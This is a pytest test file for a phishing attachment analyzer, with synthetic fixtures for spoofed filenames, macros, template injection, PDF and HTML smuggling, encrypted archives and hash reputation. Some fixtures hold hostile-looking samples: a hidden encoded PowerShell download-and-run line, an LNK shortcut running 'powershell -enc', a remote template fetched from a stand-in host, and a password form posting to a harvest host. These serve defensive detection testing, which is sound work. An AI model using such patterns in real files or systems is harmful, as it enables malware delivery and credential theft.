"""
Unit tests for Phishing Detection — Static Attachment Analyzer.

Tests AttachmentFeatureExtractor, HashReputationCache, hash threat intel
providers, AttachmentAnalyzer scoring/explanations, and SecurityEvent mapping
using strictly synthetic, harmless byte fixtures (no live malware).
"""

from __future__ import annotations

import hashlib
import io
import time
import zipfile

import pytest

from src.phishing.attachment_analyzer import (
    AttachmentAnalyzer,
    AttachmentFeatureExtractor,
    HashReputationCache,
    MockHashIntelProvider,
    SyntheticHashBlocklistProvider,
    VirusTotalHashProvider,
    safe_ascii,
)
from src.phishing.email_analyzer import EmailAnalyzer, EmailParser
from src.phishing.models import (
    EmailAttachmentInfo,
    PhishingSeverity,
    SignalCategory,
    ThreatIntelResult,
)


# ---------------------------------------------------------------------------
# Synthetic Fixture Helpers (harmless mock byte payloads)
# ---------------------------------------------------------------------------

def _make_zip_bytes(entries: dict[str, bytes], encrypt_first: bool = False) -> bytes:
    """Create an in-memory ZIP archive from filename -> content mapping."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    raw = bytearray(buf.getvalue())
    if encrypt_first:
        # Set general-purpose bit flag bit 0 (encrypted) in local file header (offset 6)
        # and central directory header (search PK\x01\x02, flag is at +8)
        raw[6] |= 0x01
        cd_idx = raw.find(b"PK\x01\x02")
        if cd_idx != -1:
            raw[cd_idx + 8] |= 0x01
    return bytes(raw)


def _make_clean_docx_bytes() -> bytes:
    return _make_zip_bytes({
        "[Content_Types].xml": b'<?xml version="1.0"?><Types></Types>',
        "word/document.xml": b"<w:document><w:body><w:p><w:r><w:t>Quarterly Report</w:t></w:r></w:p></w:body></w:document>",
        "word/_rels/document.xml.rels": b'<?xml version="1.0"?><Relationships></Relationships>',
    })


def _make_macro_docx_bytes() -> bytes:
    return _make_zip_bytes({
        "[Content_Types].xml": b'<?xml version="1.0"?><Types></Types>',
        "word/document.xml": b"<w:document><w:body><w:p><w:r><w:t>Enable Macros</w:t></w:r></w:p></w:body></w:document>",
        "word/vbaProject.bin": b"SYNTHETIC_VBA_MARKER_AutoOpen_Document_Open",
    })


def _make_template_injection_docx_bytes() -> bytes:
    rels = (
        b'<?xml version="1.0"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="https://evil-template.example.test/payload.dotm" TargetMode="External"/>'
        b'</Relationships>'
    )
    return _make_zip_bytes({
        "[Content_Types].xml": b'<?xml version="1.0"?><Types></Types>',
        "word/document.xml": b"<w:document><w:body></w:body></w:document>",
        "word/_rels/settings.xml.rels": rels,
    })


# ---------------------------------------------------------------------------
# 1. Clean / Benign Attachment Tests
# ---------------------------------------------------------------------------

class TestCleanAttachments:

    def setup_method(self) -> None:
        self.analyzer = AttachmentAnalyzer()

    def test_clean_pdf(self) -> None:
        pdf_bytes = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF"
        verdict = self.analyzer.scan_bytes(pdf_bytes, "quarterly_summary.pdf", "application/pdf")
        assert verdict.analysis_type == "attachment"
        assert verdict.is_phishing is False
        assert verdict.severity == PhishingSeverity.SAFE
        assert verdict.score == 0.0
        assert verdict.signals == []
        assert "clean" in verdict.explanation.lower()

    def test_clean_ooxml_docx(self) -> None:
        docx_bytes = _make_clean_docx_bytes()
        verdict = self.analyzer.scan_bytes(
            docx_bytes,
            "meeting_notes.docx",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        )
        assert verdict.is_phishing is False
        assert verdict.severity == PhishingSeverity.SAFE
        assert verdict.score == 0.0
        assert verdict.signals == []

    def test_clean_png_high_entropy_no_false_positive(self) -> None:
        # PNG magic header followed by compressed-looking bytes should not trigger high-entropy packing
        png_bytes = b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 2
        verdict = self.analyzer.scan_bytes(png_bytes, "logo.png", "image/png")
        assert verdict.is_phishing is False
        assert verdict.severity == PhishingSeverity.SAFE
        assert verdict.score == 0.0

    def test_clean_plain_text(self) -> None:
        txt_bytes = b"Hello team,\nPlease review the attached agenda for tomorrow's sync.\n"
        verdict = self.analyzer.scan_bytes(txt_bytes, "agenda.txt", "text/plain")
        assert verdict.is_phishing is False
        assert verdict.score == 0.0


# ---------------------------------------------------------------------------
# 2. Filename Spoofing, Double Extensions & Magic Mismatch
# ---------------------------------------------------------------------------

class TestSpoofingAndMasquerading:

    def setup_method(self) -> None:
        self.analyzer = AttachmentAnalyzer()

    def test_rtlo_filename_spoofing_is_detected_and_ascii_safe(self) -> None:
        rtlo_name = "invoice_\u202efdp.exe"
        verdict = self.analyzer.scan_bytes(b"MZ\x90\x00SYNTHETIC_PE", rtlo_name)
        assert verdict.is_phishing is True
        assert verdict.severity == PhishingSeverity.CRITICAL
        assert verdict.score >= 80.0
        sig_names = [s.name for s in verdict.signals]
        assert "rtlo_filename_spoofing" in sig_names
        # Ensure Windows console safety (pure ASCII in explanation & evidence)
        verdict.explanation.encode("ascii")
        assert "[U+202E]" in verdict.explanation
        assert safe_ascii(rtlo_name) == "invoice_[U+202E]fdp.exe"

    def test_double_extension_masquerading(self) -> None:
        verdict = self.analyzer.scan_bytes(b"MZ\x90\x00SYNTHETIC", "invoice_2026.pdf.exe")
        assert verdict.is_phishing is True
        assert verdict.severity == PhishingSeverity.CRITICAL
        sig_names = [s.name for s in verdict.signals]
        assert "double_extension_masquerading" in sig_names
        assert "executable_attachment" in sig_names

    def test_double_extension_with_whitespace_padding(self) -> None:
        verdict = self.analyzer.scan_bytes(b"var x = 1;", "contract.docx    .js")
        assert verdict.is_phishing is True
        sig_names = [s.name for s in verdict.signals]
        assert "double_extension_masquerading" in sig_names
        assert "script_attachment" in sig_names

    def test_magic_byte_extension_mismatch_pe_as_pdf(self) -> None:
        pe_bytes = b"MZ\x90\x00\x03\x00\x00\x00SYNTHETIC_PE_HEADER"
        res = self.analyzer.scan_bytes_detailed(pe_bytes, "statement.pdf", "application/pdf")
        assert res.features.detected_file_type == "pe_executable"
        assert res.features.is_extension_spoofed is True
        assert res.verdict.is_phishing is True
        assert res.verdict.severity == PhishingSeverity.CRITICAL
        assert any(s.name == "magic_byte_extension_mismatch" for s in res.verdict.signals)
        assert "T1036.008" in res.verdict.mitre_techniques

    def test_magic_byte_mismatch_html_disguised_as_doc(self) -> None:
        html_bytes = b"<!DOCTYPE html><html><body><script>atob('dGVzdA==')</script></body></html>"
        res = self.analyzer.scan_bytes_detailed(html_bytes, "remittance.doc", "application/msword")
        assert res.features.detected_file_type == "html_document"
        assert res.features.is_extension_spoofed is True
        assert res.verdict.is_phishing is True


# ---------------------------------------------------------------------------
# 3. Executables, Scripts, Office Macros, PDF & HTML Smuggling
# ---------------------------------------------------------------------------

class TestWeaponizedPayloads:

    def setup_method(self) -> None:
        self.analyzer = AttachmentAnalyzer()

    def test_script_attachment_with_offensive_strings(self) -> None:
        ps_script = (
            b"powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA\n"
            b"Invoke-Expression (New-Object Net.WebClient)\n"
        )
        verdict = self.analyzer.scan_bytes(ps_script, "update_check.ps1")
        assert verdict.is_phishing is True
        assert verdict.score >= 60.0
        sig_names = [s.name for s in verdict.signals]
        assert "script_attachment" in sig_names
        assert "suspicious_static_execution_strings" in sig_names

    def test_windows_lnk_shortcut_attachment(self) -> None:
        lnk_bytes = b"L\x00\x00\x00\x01\x14\x02\x00" + b"cmd.exe /c powershell -enc AAA"
        res = self.analyzer.scan_bytes_detailed(lnk_bytes, "shared_folder.lnk")
        assert res.features.detected_file_type == "windows_lnk"
        assert res.features.is_executable is True
        assert res.verdict.is_phishing is True
        assert res.verdict.score >= 70.0

    def test_ooxml_embedded_vba_macro_even_with_docx_extension(self) -> None:
        macro_docx = _make_macro_docx_bytes()
        res = self.analyzer.scan_bytes_detailed(macro_docx, "payroll_bonus.docx")
        assert res.features.has_embedded_macros is True
        assert res.features.is_macro_enabled is True
        assert res.verdict.is_phishing is True
        assert any(s.name == "embedded_vba_macros" for s in res.verdict.signals)

    def test_ooxml_external_template_injection(self) -> None:
        tmpl_docx = _make_template_injection_docx_bytes()
        res = self.analyzer.scan_bytes_detailed(tmpl_docx, "hr_policy.docx")
        assert res.features.has_external_template is True
        assert "https://evil-template.example.test/payload.dotm" in res.features.extracted_urls
        assert res.verdict.is_phishing is True
        assert any(s.name == "external_template_injection" for s in res.verdict.signals)
        assert "T1221" in res.verdict.mitre_techniques

    def test_legacy_ole2_macro_detection(self) -> None:
        ole_bytes = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32 + b"_VBA_PROJECT AutoOpen"
        res = self.analyzer.scan_bytes_detailed(ole_bytes, "invoice.doc")
        assert res.features.detected_file_type == "ole2_compound"
        assert res.features.has_embedded_macros is True
        assert res.verdict.is_phishing is True

    def test_rtf_embedded_object_detection(self) -> None:
        rtf_bytes = b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objdata 01050000}}}"
        res = self.analyzer.scan_bytes_detailed(rtf_bytes, "memo.rtf")
        assert res.features.detected_file_type == "rtf"
        assert res.features.has_embedded_macros is True
        assert res.verdict.is_phishing is True

    def test_weaponized_pdf_active_tags(self) -> None:
        pdf_bytes = (
            b"%PDF-1.7\n1 0 obj\n<< /OpenAction 2 0 R /JS (app.alert(1)) /Launch /EmbeddedFile >>\nendobj"
        )
        res = self.analyzer.scan_bytes_detailed(pdf_bytes, "wire_transfer.pdf")
        assert res.features.has_pdf_active_content is True
        assert res.verdict.is_phishing is True
        assert any(s.name == "weaponized_pdf_active_content" for s in res.verdict.signals)
        assert "T1204.002" in res.verdict.mitre_techniques

    def test_html_smuggling_and_credential_form(self) -> None:
        html_smuggle = (
            b"<html><body>"
            b"<form action='https://harvest.example.test/post'>"
            b"<input type='password' name='pwd'/></form>"
            b"<script>const b = new Blob([atob('QUFB')], {type:'application/octet-stream'});"
            b"URL.createObjectURL(b);</script>"
            b"</body></html>"
        )
        res = self.analyzer.scan_bytes_detailed(html_smuggle, "secure_message.html", "text/html")
        assert res.features.has_html_smuggling is True
        assert res.verdict.is_phishing is True
        assert any(s.name == "html_svg_smuggling_indicators" for s in res.verdict.signals)

    def test_svg_with_inline_script(self) -> None:
        svg_bytes = b'<svg xmlns="http://www.w3.org/2000/svg"><script>atob("aHR0cDovL2V2aWw=")</script></svg>'
        res = self.analyzer.scan_bytes_detailed(svg_bytes, "receipt.svg", "image/svg+xml")
        assert res.features.detected_file_type == "svg_image"
        assert res.features.has_html_smuggling is True
        assert res.verdict.is_phishing is True


# ---------------------------------------------------------------------------
# 4. Archive Inspection & High Entropy Tests
# ---------------------------------------------------------------------------

class TestArchiveAndEntropy:

    def setup_method(self) -> None:
        self.analyzer = AttachmentAnalyzer()

    def test_clean_zip_archive(self) -> None:
        clean_zip = _make_zip_bytes({"readme.txt": b"Quarterly docs", "notes.csv": b"a,b\n1,2\n"})
        res = self.analyzer.scan_bytes_detailed(clean_zip, "docs.zip", "application/zip")
        assert res.features.is_archive is True
        assert res.features.archive_suspicious_members == []
        assert res.features.is_encrypted_archive is False
        assert res.verdict.is_phishing is False
        assert res.verdict.severity == PhishingSeverity.LOW

    def test_zip_containing_dangerous_executable(self) -> None:
        bad_zip = _make_zip_bytes({"readme.txt": b"open me", "invoice.pdf.exe": b"MZ\x90\x00"})
        res = self.analyzer.scan_bytes_detailed(bad_zip, "invoice_bundle.zip", "application/zip")
        assert "invoice.pdf.exe" in res.features.archive_suspicious_members
        assert res.verdict.is_phishing is True
        assert any(s.name == "archive_contains_dangerous_payload" for s in res.verdict.signals)

    def test_encrypted_zip_bypass_detected(self) -> None:
        enc_zip = _make_zip_bytes({"secret.txt": b"locked"}, encrypt_first=True)
        res = self.analyzer.scan_bytes_detailed(enc_zip, "protected.zip", "application/zip")
        assert res.features.is_encrypted_archive is True
        assert res.verdict.is_phishing is True
        assert any(s.name == "encrypted_archive_bypass" for s in res.verdict.signals)

    def test_high_entropy_packed_unknown_blob(self) -> None:
        # Deterministic uniform distribution across all 256 byte values -> ~8.0 bits/byte entropy
        uniform_blob = bytes(range(256)) * 4
        res = self.analyzer.scan_bytes_detailed(uniform_blob, "payload.bin")
        assert res.features.shannon_entropy >= 7.9
        assert any(s.name == "high_entropy_packed_payload" for s in res.verdict.signals)


# ---------------------------------------------------------------------------
# 5. Hash Threat Intelligence, Caching & Timeout Degradation
# ---------------------------------------------------------------------------

class TestHashIntelAndCache:

    def test_synthetic_blocklist_eicar_match(self) -> None:
        # Standard harmless EICAR test string
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        analyzer = AttachmentAnalyzer()
        res = analyzer.scan_bytes_detailed(eicar, "eicar_test.txt", "text/plain")
        assert res.features.sha256 == SyntheticHashBlocklistProvider.EICAR_SHA256
        assert res.threat_intel is not None
        assert res.threat_intel.is_malicious is True
        assert res.verdict.is_phishing is True
        assert res.verdict.score >= 80.0
        assert any(s.name == "attachment_hash_threat_intel_match" for s in res.verdict.signals)

    def test_hash_cache_avoids_repeated_provider_calls(self) -> None:
        payload = b"MMS-CACHE-TEST-PAYLOAD"
        sha = hashlib.sha256(payload).hexdigest()
        mock_provider = MockHashIntelProvider(
            malicious_hashes={
                sha: ThreatIntelResult(
                    ioc=sha,
                    is_malicious=True,
                    threat_score=85.0,
                    source="mock_hash_provider",
                    positives=20,
                    total_engines=70,
                )
            }
        )
        analyzer = AttachmentAnalyzer(hash_provider=mock_provider)
        v1 = analyzer.scan_bytes(payload, "sample.bin")
        v2 = analyzer.scan_bytes(payload, "sample.bin")
        assert v1.is_phishing is True
        assert v2.is_phishing is True
        assert mock_provider.call_count == 1
        assert len(analyzer.cache) == 1

    def test_hash_cache_ttl_expiration(self) -> None:
        cache = HashReputationCache(default_ttl_seconds=0.05, max_entries=10)
        ti = ThreatIntelResult(ioc="abc", is_malicious=False, source="test")
        cache.set("abc", ti)
        assert cache.get("abc") is not None
        time.sleep(0.08)
        assert cache.get("abc") is None

    def test_timeout_and_exception_graceful_degradation(self) -> None:
        slow_provider = MockHashIntelProvider(delay_seconds=1.0)
        analyzer = AttachmentAnalyzer(hash_provider=slow_provider, intel_timeout_seconds=0.05)
        res = analyzer.scan_bytes_detailed(b"MZ\x90\x00test", "dropper.exe")
        # Must degrade gracefully without raising and still score local static signals
        assert res.threat_intel is not None
        assert res.threat_intel.source == "fallback_degraded"
        assert res.verdict.is_phishing is True
        assert res.verdict.score >= 40.0

        broken_provider = MockHashIntelProvider(raise_exception=RuntimeError("network down"))
        analyzer2 = AttachmentAnalyzer(hash_provider=broken_provider)
        res2 = analyzer2.scan_bytes_detailed(b"normal text", "notes.txt")
        assert res2.threat_intel is not None
        assert res2.threat_intel.source == "fallback_degraded"
        assert res2.verdict.is_phishing is False

    def test_virustotal_provider_falls_back_without_api_key(self) -> None:
        provider = VirusTotalHashProvider(api_key="")
        res = provider.lookup_hash(SyntheticHashBlocklistProvider.EICAR_SHA256)
        assert res.is_malicious is True
        assert res.source == "synthetic_hash_blocklist"


# ---------------------------------------------------------------------------
# 6. Metadata-Only Scanning, Email Integration, Edge Cases & SecurityEvent
# ---------------------------------------------------------------------------

class TestIntegrationAndPipelineMapping:

    def test_scan_metadata_only(self) -> None:
        analyzer = AttachmentAnalyzer()
        meta = EmailAttachmentInfo(
            filename="bonus_\u202ecod.exe",
            content_type="application/octet-stream",
            size_bytes=12345,
            sha256=SyntheticHashBlocklistProvider.EICAR_SHA256,
            is_executable=True,
            extension=".exe",
        )
        verdict = analyzer.scan_metadata(meta, email_id="email-123")
        assert verdict.email_id == "email-123"
        assert verdict.is_phishing is True
        assert verdict.score >= 80.0
        assert any(s.category == SignalCategory.THREAT_INTEL_MATCH for s in verdict.signals)

    def test_email_analyzer_with_attachment_analyzer(self) -> None:
        raw_email = (
            "From: finance@partner.example\r\n"
            "To: staff@target.corp\r\n"
            "Subject: Payment Document\r\n"
            "MIME-Version: 1.0\r\n"
            'Content-Type: multipart/mixed; boundary="BOUNDARY"\r\n\r\n'
            "--BOUNDARY\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "Please see attached.\r\n"
            "--BOUNDARY\r\n"
            'Content-Type: application/octet-stream; name="invoice.pdf.exe"\r\n'
            'Content-Disposition: attachment; filename="invoice.pdf.exe"\r\n\r\n'
            "MZ_SYNTHETIC\r\n"
            "--BOUNDARY--\r\n"
        )
        parsed = EmailParser.parse_raw_string(raw_email)
        att_analyzer = AttachmentAnalyzer()
        email_analyzer = EmailAnalyzer(attachment_analyzer=att_analyzer)
        verdict = email_analyzer.analyze(parsed)
        assert any(s.name == "double_extension_masquerading" for s in verdict.signals)
        assert verdict.is_phishing is True

    def test_to_security_event_safe_and_malicious(self) -> None:
        analyzer = AttachmentAnalyzer()
        clean_res = analyzer.scan_bytes_detailed(b"hello world", "hello.txt")
        clean_ev = analyzer.to_security_event(clean_res.verdict, clean_res.features, source_user="alice")
        assert clean_ev.source == "phishing"
        assert clean_ev.event_type == "phishing_attachment_scanned"
        assert clean_ev.severity == "low"
        assert clean_ev.entity.user == "alice"
        assert clean_ev.entity.hash == clean_res.features.sha256

        bad_res = analyzer.scan_bytes_detailed(b"MZ\x90\x00bad", "invoice.pdf.exe")
        bad_ev = analyzer.to_security_event(bad_res.verdict, bad_res.features, source_user="bob")
        assert bad_ev.event_type == "phishing_attachment_detected"
        assert bad_ev.severity == "critical"
        assert bad_ev.entity.hash == bad_res.features.sha256

    def test_empty_and_malformed_inputs_never_crash(self) -> None:
        analyzer = AttachmentAnalyzer()
        empty_verdict = analyzer.scan_bytes(b"", "")
        assert empty_verdict.score == 0.0
        assert empty_verdict.severity == PhishingSeverity.SAFE

        corrupt_zip = b"PK\x03\x04CORRUPTED_TRUNCATED_ZIP_STREAM"
        res = analyzer.scan_bytes_detailed(corrupt_zip, "broken.zip")
        assert res.features.detected_file_type == "zip_container"
        assert res.verdict.explanation != ""

